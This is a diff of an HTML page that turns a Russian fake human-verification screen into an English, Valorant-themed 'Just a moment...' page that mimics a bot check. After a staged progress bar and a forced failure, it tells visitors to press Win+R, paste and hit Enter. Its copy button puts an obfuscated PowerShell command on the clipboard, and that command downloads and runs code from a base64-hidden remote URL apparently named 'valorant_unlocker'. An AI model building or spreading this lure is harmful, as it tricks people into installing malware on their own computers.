@@ -1,77 +1,343 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Проверка безопасности</title>
+<title>Just a moment...</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body { background: #0a0a0a; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-.box { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 12px; padding: 40px; max-width: 480px; width: 100%; text-align: center; }
-.logo { font-size: 32px; font-weight: 700; margin-bottom: 20px; color: #5865F2; }
-h2 { font-size: 20px; margin-bottom: 12px; font-weight: 600; }
-p { color: #a0a0a0; font-size: 14px; line-height: 1.6; margin-bottom: 24px; }
-button { background: #5865F2; color: #fff; border: none; padding: 14px 32px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
-button:hover { background: #4752c4; }
-.steps { text-align: left; background: #0f0f0f; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
-.step { display: flex; align-items: center; margin-bottom: 12px; font-size: 14px; }
+body { 
+  background: #1a1a1a;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.bg-blur {
+  position: fixed;
+  inset: 0;
+  background: 
+    linear-gradient(135deg, rgba(255,70,85,0.3) 0%, rgba(0,0,0,0.8) 50%, rgba(255,70,85,0.2) 100%),
+    url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="%23ff4655" width="100" height="100" opacity="0.15"/><circle cx="20" cy="20" r="15" fill="%23ff4655" opacity="0.2"/><circle cx="80" cy="60" r="20" fill="%23ff4655" opacity="0.15"/><circle cx="40" cy="80" r="10" fill="%23ff4655" opacity="0.25"/></svg>');
+  filter: blur(60px);
+  transform: scale(1.2);
+  z-index: 0;
+}
+
+.bg-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.5);
+  z-index: 1;
+}
+
+.card {
+  position: relative;
+  z-index: 2;
+  background: #1a1a1a;
+  border: 1px solid #2a2a2a;
+  border-radius: 12px;
+  padding: 44px 40px;
+  max-width: 460px;
+  width: 100%;
+  margin: 20px;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+}
+
+.valorant-logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 28px;
+}
+.valorant-logo svg {
+  width: 64px;
+  height: 64px;
+  filter: drop-shadow(0 0 20px rgba(255,70,85,0.4));
+}
+
+h2 {
+  font-size: 22px;
+  margin-bottom: 10px;
+  font-weight: 600;
+  color: #fff;
+  letter-spacing: -0.3px;
+}
+
+.subtitle {
+  color: #888;
+  font-size: 14px;
+  line-height: 1.6;
+  margin-bottom: 28px;
+  min-height: 22px;
+}
+
+/* Прогресс-бар */
+.progress-container {
+  width: 100%;
+  height: 4px;
+  background: #2a2a2a;
+  border-radius: 4px;
+  overflow: hidden;
+  margin-bottom: 16px;
+}
+
+.progress-bar {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, #ff4655, #ff7a85);
+  transition: width 0.4s ease;
+  border-radius: 4px;
+}
+
+.progress-text {
+  font-size: 12px;
+  color: #666;
+  font-family: 'SF Mono', Monaco, monospace;
+  text-align: left;
+  min-height: 18px;
+  margin-bottom: 20px;
+}
+
+/* Кнопки */
+button {
+  background: #ff4655;
+  color: #fff;
+  border: none;
+  padding: 14px 32px;
+  border-radius: 6px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  width: 100%;
+  transition: all 0.2s;
+  letter-spacing: 0.3px;
+}
+
+button:hover { 
+  background: #e63a48;
+  transform: translateY(-1px);
+  box-shadow: 0 8px 20px rgba(255,70,85,0.3);
+}
+
+button:active { transform: translateY(0); }
+button:disabled { opacity: 0.8; cursor: wait; }
+button.success { background: #3ba55c; }
+
+/* Шаги */
+.steps {
+  text-align: left;
+  background: #0f0f0f;
+  border: 1px solid #2a2a2a;
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 20px;
+}
+
+.step {
+  display: flex;
+  align-items: center;
+  margin-bottom: 14px;
+  font-size: 14px;
+  color: #ccc;
+}
+
 .step:last-child { margin-bottom: 0; }
-.num { background: #5865F2; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; margin-right: 12px; flex-shrink: 0; }
-kbd { background: #2a2a2a; padding: 2px 8px; border-radius: 4px; font-family: monospace; font-size: 13px; border: 1px solid #3a3a3a; margin: 0 4px; }
-.spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
-@keyframes spin { to { transform: rotate(360deg); } }
+
+.num {
+  background: #ff4655;
+  color: #fff;
+  width: 26px;
+  height: 26px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  font-weight: 700;
+  margin-right: 14px;
+  flex-shrink: 0;
+}
+
+kbd {
+  background: #2a2a2a;
+  padding: 3px 9px;
+  border-radius: 4px;
+  font-family: 'SF Mono', Monaco, monospace;
+  font-size: 12px;
+  border: 1px solid #3a3a3a;
+  margin: 0 4px;
+  color: #fff;
+  display: inline-block;
+}
+
 .hidden { display: none; }
-.error { color: #ed4245; font-size: 13px; margin-top: 16px; }
+
+/* Футер */
+.footer {
+  margin-top: 32px;
+  padding-top: 20px;
+  border-top: 1px solid #2a2a2a;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 12px;
+  color: #666;
+}
+
+.footer-brand {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  color: #888;
+}
+
+.footer-brand svg { width: 16px; height: 16px; opacity: 0.7; }
+.footer a { color: #888; text-decoration: none; }
+.footer a:hover { color: #ff4655; }
+
+.ray-id {
+  font-family: 'SF Mono', Monaco, monospace;
+  font-size: 11px;
+  color: #555;
+  margin-top: 16px;
+  text-align: center;
+}
+
+@media (max-width: 480px) {
+  .card { padding: 32px 24px; }
+  h2 { font-size: 19px; }
+  .steps { padding: 16px; }
+  .footer { flex-direction: column; gap: 10px; }
+}
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="logo">🛡️</div>
-  <div id="step1">
-    <h2>Подтвердите что вы человек</h2>
-    <p>Для продолжения необходимо пройти проверку безопасности</p>
-    <button onclick="startVerify()" id="btn1">Я не робот</button>
+
+<div class="bg-blur"></div>
+<div class="bg-overlay"></div>
+
+<div class="card">
+  <div class="valorant-logo">
+    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="50,8 96,92 76,92 50,42 24,92 4,92" fill="#ff4655"/>
+      <polygon points="50,42 76,92 24,92" fill="#0a0a0a" opacity="0.35"/>
+    </svg>
   </div>
 
-  <div id="step2" class="hidden">
-    <h2>Верификация</h2>
-    <p>Автоматическая проверка не удалась. Выполните следующие шаги вручную:</p>
-    <div class="steps">
-      <div class="step"><div class="num">1</div><div>Нажмите <kbd>Win</kbd>+<kbd>R</kbd> на клавиатуре</div></div>
-      <div class="step"><div class="num">2</div><div>Нажмите <kbd>Ctrl</kbd>+<kbd>V</kbd> чтобы вставить код</div></div>
-      <div class="step"><div class="num">3</div><div>Нажмите <kbd>Enter</kbd></div></div>
+  <!-- СЦЕНА 1: Загрузка с прогрессом -->
+  <div id="step-loading">
+    <h2>Just a moment...</h2>
+    <p class="subtitle" id="loading-text">Establishing secure connection</p>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
     </div>
-    <button onclick="copyCmd()" id="btn2">Скопировать код проверки</button>
-    <div class="error" id="err"></div>
+    <div class="progress-text" id="progressText">0%</div>
   </div>
+
+  <!-- СЦЕНА 2: Ошибка проверки -->
+  <div id="step-fail" class="hidden">
+    <h2 style="color: #ff4655;">Verification Failed</h2>
+    <p class="subtitle">Automated security check could not be completed. Manual verification is required to continue.</p>
+    <div class="steps">
+      <div class="step"><div class="num">1</div><div>Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard</div></div>
+      <div class="step"><div class="num">2</div><div>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the code</div></div>
+      <div class="step"><div class="num">3</div><div>Press <kbd>Enter</kbd> to complete verification</div></div>
+    </div>
+    <button onclick="copyCmd()" id="btn2">Copy verification code</button>
+  </div>
+
+  <div class="footer">
+    <div class="footer-brand">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L3 7V12C3 16.97 6.84 21.5 12 22.5C17.16 21.5 21 16.97 21 12V7L12 2Z" fill="#ff4655"/>
+      </svg>
+      <span>Security Check</span>
+    </div>
+    <a href="#">Privacy</a>
+  </div>
+
+  <div class="ray-id" id="rayId"></div>
 </div>
 
 <script>
 const CMD = `iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz0xNzcxMzM1MDg3L3ZhbG9yYW50X3VubG9ja2Vy'))) -UseBasicParsing)`;
 
-function startVerify() {
-  document.getElementById('btn1').innerHTML = '<span class="spinner"></span>';
-  document.getElementById('btn1').disabled = true;
-  setTimeout(() => {
-    document.getElementById('step1').classList.add('hidden');
-    document.getElementById('step2').classList.remove('hidden');
-  }, 1500);
+// Ray ID
+function generateRayId() {
+  const chars = '0123456789abcdef';
+  let id = '';
+  for (let i = 0; i < 16; i++) {
+    id += chars[Math.floor(Math.random() * chars.length)];
+    if (i === 7) id += '-';
+  }
+  document.getElementById('rayId').textContent = 'Ray ID: ' + id;
+}
+generateRayId();
+
+// Этапы загрузки
+const stages = [
+  { p: 8,  t: 'Establishing secure connection...' },
+  { p: 22, t: 'Verifying browser fingerprint...' },
+  { p: 41, t: 'Checking device integrity...' },
+  { p: 58, t: 'Analyzing network behavior...' },
+  { p: 73, t: 'Running anti-bot verification...' },
+  { p: 89, t: 'Finalizing security check...' },
+  { p: 100, t: 'Error: verification failed' }
+];
+
+const bar = document.getElementById('progressBar');
+const txt = document.getElementById('progressText');
+const loadingText = document.getElementById('loading-text');
+
+let stageIndex = 0;
+
+function runProgress() {
+  if (stageIndex >= stages.length) {
+    // Небольшая задержка чтобы юзер увидел 100% и потом fail
+    setTimeout(() => {
+      document.getElementById('step-loading').classList.add('hidden');
+      document.getElementById('step-fail').classList.remove('hidden');
+      generateRayId();
+    }, 800);
+    return;
+  }
+
+  const stage = stages[stageIndex];
+  bar.style.width = stage.p + '%';
+  txt.textContent = stage.p + '%';
+  loadingText.textContent = stage.t;
+
+  // Последний этап с ошибкой — держим дольше
+  const delay = stage.p === 100 ? 1200 : 700 + Math.random() * 600;
+  
+  stageIndex++;
+  setTimeout(runProgress, delay);
 }
 
+// Старт через 300мс после загрузки страницы
+setTimeout(runProgress, 300);
+
+// Копирование
 async function copyCmd() {
   try {
     await navigator.clipboard.writeText(CMD);
-    document.getElementById('btn2').textContent = '✓ Код скопирован';
-    document.getElementById('btn2').style.background = '#3ba55c';
+    document.getElementById('btn2').textContent = '✓ Code copied to clipboard';
+    document.getElementById('btn2').classList.add('success');
   } catch (e) {
     const ta = document.createElement('textarea');
     ta.value = CMD;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
     document.body.appendChild(ta);
     ta.select();
     document.execCommand('copy');
     document.body.removeChild(ta);
-    document.getElementById('btn2').textContent = '✓ Код скопирован';
-    document.getElementById('btn2').style.background = '#3ba55c';
+    document.getElementById('btn2').textContent = '✓ Code copied to clipboard';
+    document.getElementById('btn2').classList.add('success');
   }
 }
 </script>
